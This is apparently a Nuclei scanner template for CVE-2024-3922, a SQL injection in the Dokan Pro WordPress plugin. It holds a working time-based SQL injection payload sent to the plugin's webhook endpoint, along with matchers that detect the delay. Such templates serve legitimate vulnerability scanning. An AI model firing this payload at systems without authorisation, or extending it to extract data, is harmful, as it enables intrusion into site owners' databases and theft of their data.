id: CVE-2024-3922

info:
  name: Dokan Pro <= 3.10.3 - SQL Injection
  author: s4e-io
  severity: critical
  description: |
    The Dokan Pro plugin for WordPress is vulnerable to SQL Injection via the 'code' parameter in all versions up to, and including, 3.10.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.
  impact: |
    Unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.
  remediation: |
    Fixed in 3.11.0
  reference:
    - https://dokan.co/docs/wordpress/changelog/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3922
  classification:
    epss-score: 0.89443
    epss-percentile: 0.99521
    cpe: cpe:2.3:a:wedevs:dokan:*:*:*:*:wordpress:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: wedevs
    product: dokan
    publicwww-query: "/wp-content/plugins/dokan-pro/"
  tags: time-based-sqli,cve,cve2024,dokan,wp-plugin,wordpress,wp,dokan-pro,sqli,vuln
flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/dokan-pro/changelog.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "Dokan product"
        internal: true

  - raw:
      - |
        @timeout: 20s
        POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
        Host: {{Hostname}}

        {"env":"1","event":"invoice.created","resource":{"subscription_code":"11111' and (select 1 from (select sleep( if(1=1,6,0) ))x )='"}}

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
          - "status_code == 302"
        condition: and
# digest: 4b0a00483046022100d3d943ec0b0942113e76a4fa1730c9efa6f72ad3a8035171c76ba029f3d6a113022100a8db8906e6f57163f21ef68563e74595c5903db53982e3f7c1b01796a8824710:922c64590222798bb761d5b6d8e72950